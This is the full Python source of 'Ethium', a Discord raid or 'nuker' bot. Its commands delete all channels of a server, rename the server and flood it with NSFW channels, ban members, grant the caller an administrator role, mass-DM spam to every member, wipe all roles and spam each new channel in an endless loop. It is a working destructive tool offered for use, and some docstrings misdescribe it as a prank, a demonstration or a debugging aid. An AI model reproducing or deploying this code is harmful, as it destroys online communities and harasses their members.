import asyncio
import logging as log
import os
import sys
from datetime import datetime as dt
from multiprocessing import Process
from typing import Callable, Dict, Optional, Union

import discord
import httpx
from discord.ext import commands as cmds
from rgbprint import Color, gradient_print

TOKEN: str = ''
PREFIX: str = r''
SERVER_NAME: str = ''
ICON_URL: str = ''
CHANNELS_NAME: str = ''
ROLES_NAME: str = ''
SPAM_MSG: str = ''


cls: Callable[[], None] = lambda: os.system('cls || clear')


async def banner() -> None:
    '''
    The banner function is a coroutine that prints the bot's banner to the console.
    It also logs some useful information about the bot, such as its name, commands and prefix.

    :return: None.
    '''
    BANNER: str = ''''
▄███▄     ▄▄▄▄▀ ▄  █ ▄█   ▄   █▀▄▀█ 
█▀   ▀ ▀▀▀ █   █   █ ██    █  █ █ █ 
██▄▄       █   ██▀▀█ ██ █   █ █ ▄ █ 
█▄   ▄▀   █    █   █ ▐█ █   █ █   █ 
▀███▀    ▀        █   ▐ █▄ ▄█    █  
                 ▀       ▀▀▀    ▀
    '''
    _dev: discord.User = await ethium.fetch_user(843511119033401394)
    cmds: str = ' ~ '.join([cmd.name for cmd in ethium.commands])
    cls()
    gradient_print(BANNER, start_color=Color.thistle, end_color=Color.white_smoke)
    log.info(f'Logged in as {ethium.user}')
    log.info(f'Commands: {cmds}')
    log.info(f'Prefix: {ethium.command_prefix}')
    log.info(f'Coded by {_dev}\n')


ethium: cmds.Bot = cmds.Bot(
    command_prefix=PREFIX,
    help_command=None,
    intents=discord.Intents.all(),
)


@ethium.event
async def on_ready() -> None:
    '''
    The on_ready function is called when the bot is ready to start interacting with Discord.
    This function is a coroutine, and it should be treated as such.
    It will print out some information about the bot, including its name and ID.

    :return: None.
    '''
    ACTIVITY_NAME: str = '#Ethium'
    TWITCH_URL: str = 'https://twitch.tv/S4vitaar'
    activity: discord.Streaming = discord.Streaming(name=ACTIVITY_NAME, url=TWITCH_URL)
    try:
        await ethium.change_presence(activity=activity)
        await banner()

    except Exception as e:
        log.error(f'An error occurred while changing the status {e}')


@ethium.event
async def on_command(ctx: cmds.Context) -> None:
    '''
    The on_command function is a coroutine that is called whenever a command is executed.
    It logs the command and author to the console, then deletes the message.

    :param ctx:cmds.Context: Used to Pass the context of the command to.
    :return: None.
    '''
    cmd: Optional[cmds.Command] = ctx.command
    author: Union[discord.User, discord.Member] = ctx.author
    log.info(f'Command {cmd} executed by {author}')
    try:
        await ctx.message.delete()
    except Exception as e:
        log.error(f'An error occurred while deleting the message {e}')


@ethium.event
async def on_command_error(
    ctx: cmds.Context, exception: Union[cmds.CommandError, Exception]
) -> None:
    '''
    The on_command_error function is a coroutine that is called when an error occurs while invoking a command.
    The event name is on_command_error.
    This function takes two parameters: the Command object and the exception raised. The exception will be of type Exception, or subclass thereof.

    :param _: Used to Represent the bot object.
    :param exception:Union[cmds.CommandError: Used to Catch any errors that are raised by the command.
    :param Exception]: Used to Catch any exception that may occur.
    :return: None.
    '''
    exception = getattr(exception, 'original', exception)
    if isinstance(exception, cmds.CommandOnCooldown):
        try:
            await ctx.send(f'> {ctx.author.mention} command has cooldown, try after.')
        except Exception as e:
            log.error(f'An error occurred while sending the message {e}')
    log.error(exception)


@ethium.event
async def on_command_completion(ctx: cmds.Context) -> None:
    '''
    The on_command_completion function is a coroutine that is called when a command finishes executing.
    It prints the banner to the console.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None.
    '''
    await banner()


@ethium.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel) -> None:
    '''
    The on_guild_channel_create function is a coroutine that is called when a channel is created in the guild.
    It checks if the channel's position is 0, and if it isn't, it sends SPAM_MSG to the channel.

    :param channel:discord.abc.GuildChannel: Used to Store the channel that was created.
    :return: None.
    '''
    if channel.position == 0:
        return

    while True:
        try:
            await channel.send(SPAM_MSG)
            log.info(f'Spammed channel {channel}')

        except Exception as e:
            log.error(f'An error occurred while spamming the message {e}')


@ethium.command(
    description='This command allows you to delete all channels from the server.'
)
async def nuke(ctx: cmds.Context) -> None:
    '''
    The nuke function is a command that deletes all channels in the guild,
    and then creates a new channel with the name specified by CHANNELS_NAME.
    It also sends SPAM_MSG to this newly created channel.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    _URL: str = 'https://discord.com/api/v10/channels/%s'
    _HEADERS: Dict[str, str] = {'Authorization': f'Bot {TOKEN}'}

    async def del_channel(channel_id) -> None:
        async with httpx.AsyncClient() as client:
            await client.delete(_URL % channel_id, headers=_HEADERS)

    for channel in guild.channels:
        Process(target=asyncio.run, args=(del_channel(channel.id),)).start()
        log.info(f'Deleted channel {channel}')

    channel: discord.TextChannel = await guild.create_text_channel(CHANNELS_NAME)
    await channel.send(SPAM_MSG)


@ethium.command(
    description='This command will allow you to create 50 channels with undefined ping on each channel (cooldown of 10 min).'
)
@cmds.cooldown(1, 600)
async def raid(ctx: cmds.Context) -> None:
    '''
    The raid function is a command that will change the server name and icon to
    the values defined in the constants at the top of this file. It will then create
    50 text channels with names defined by CHANNELS_NAME. This is meant to be used as
    a prank on your friends, but it can also be used for malicious purposes.

    :param ctx:cmds.Context: Used to Get the guild that the command was used in.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild

    if ICON_URL is None:
        raise ValueError('Empty icon url')

    _response: httpx.Response = httpx.get(ICON_URL)
    guild_icon: bytes = _response.content
    await guild.edit(name=SERVER_NAME, icon=guild_icon)
    for _ in range(50):
        channel: discord.TextChannel = await guild.create_text_channel(
            CHANNELS_NAME, nsfw=True
        )
        log.info(f'Created channel {channel}')


@ethium.command(
    name='massban',
    description='This command will ban all server members with a lower role than the bot.',
)
async def mass_ban(ctx: cmds.Context) -> None:
    '''
    The mass_ban function is a command that will ban every member in the guild
    except for the author and bot. This is useful if you want to clear out a server
    of all members, or just want to have fun.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    for member in [
        member for member in guild.members if not member in (ctx.author, ethium.user)
    ]:

        bot_member = await ethium.get_member(ethium.user.id)

        if member.top_role.position < bot_member.top_role.position:
            continue

        await guild.ban(member)
        log.info(f'Executed member {member}')


@ethium.command(
    name='admin',
    description='This command will create a role with administrator permission and assign it to you.',
)
async def get_admin(ctx: cmds.Context) -> None:
    '''
    The get_admin function is a command that allows the user to get admin
    permissions on the server. This is useful for debugging purposes, but should
    not be used in production.

    :param ctx:cmds.Context: Used to Pass the context of the command.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    author: Union[discord.User, discord.Member] = ctx.author
    role: discord.Role = await guild.create_role(
        name=PREFIX, permissions=discord.Permissions().all()
    )
    await author.add_roles(role)
    log.info(f'Role added {role} to {author}')


@ethium.command(
    name='massdm', description='This command will spam the DM of all server members.'
)
async def mass_dm(ctx: cmds.Context) -> None:
    '''
    The mass_dm function is a command that sends the SPAM_MSG to every member of
    the guild except for the author and Ethium. It is used as a demonstration of how
    to use commands in Ethium.

    :param ctx:cmds.Context: Used to Get the guild, author and bot.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    for member in [
        member for member in guild.members if not member in (ctx.author, ethium.user)
    ]:
        channel: discord.DMChannel = await member.create_dm()
        await channel.send(SPAM_MSG)
        log.info(f'Spammed DM {channel}')


@ethium.command(
    name='delroles', description='This command will remove all roles from the server.'
)
async def del_roles(ctx: cmds.Context) -> None:
    '''
    The del_roles function deletes all roles in a guild except for the @everyone role.

    Parameters:

        ctx (cmds.Context): The context of the command that was invoked, which contains information about the message and channel it was sent from, as well as other useful information such as who sent it and what guild they are in.

    :param ctx:cmds.Context: Used to Get the guild object.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    for role in [role for role in guild.roles if role.name != 'everyone']:
        await role.delete()
        log.info(f'Deleted role {role}')


@ethium.command(
    name='mkroles',
    description='This command will create the number of roles that are missing to reach 250 roles (the maximum).',
)
async def make_roles(ctx: cmds.Context) -> None:
    '''
    The make_roles function creates 250 roles in the guild.

    The make_roles function is used to create 250 roles in the guild, which are then used by the bot to assign a role for each user that joins. The name of these roles is 'User'. This function should only be called once per server, as it will not check if there are already enough roles created before creating more.

    :param ctx:cmds.Context: Used to Get the guild from the context.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    for _ in range(250 - len(guild.roles)):
        role: discord.Role = await guild.create_role(name=ROLES_NAME)
        log.info(f'Created role {role}')


@ethium.command(
    description='This command shows you the help, the list of commands and their respective uses.'
)
async def help(ctx: cmds.Context) -> None:
    '''
    The help function is a command that displays all of the available commands
    that Ethium has to offer. It also includes a description for each command, as well
    as the prefix used by Ethium.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None.
    '''
    author: Union[discord.User, discord.Member] = ctx.author
    _dev: discord.User = await ethium.fetch_user(843511119033401394)
    embed: discord.Embed = discord.Embed(
        title='Ethium | Commands',
        description=f'Below is a list of my available **commands**.\n> My prefix is: **{ethium.command_prefix}**',
        color=0x000,
        url='https://angits.github.io/',
        timestamp=dt.utcnow(),
    )

    embed.set_author(name=_dev, icon_url=_dev.avatar)
    embed.set_thumbnail(url=ethium.user.avatar)
    embed.set_footer(text=author.name, icon_url=author.avatar)

    for cmd in ethium.commands:
        embed.add_field(
            name=cmd.name,
            value=f'```fix\n{cmd.description}```',
            inline=False,
        )

    await ctx.send(embed=embed)


if __name__ == '__main__':
    log.basicConfig(
        level=log.INFO,
        format=f'{Color.thistle}[%(asctime)s] - {Color.white_smoke}%(message)s',
        datefmt='%I:%M:%S',
    )
    try:
        ethium.run(TOKEN)
    except Exception as e:
        log.error(f'An error occurred while logging into the client {e}')
        sys.exit()
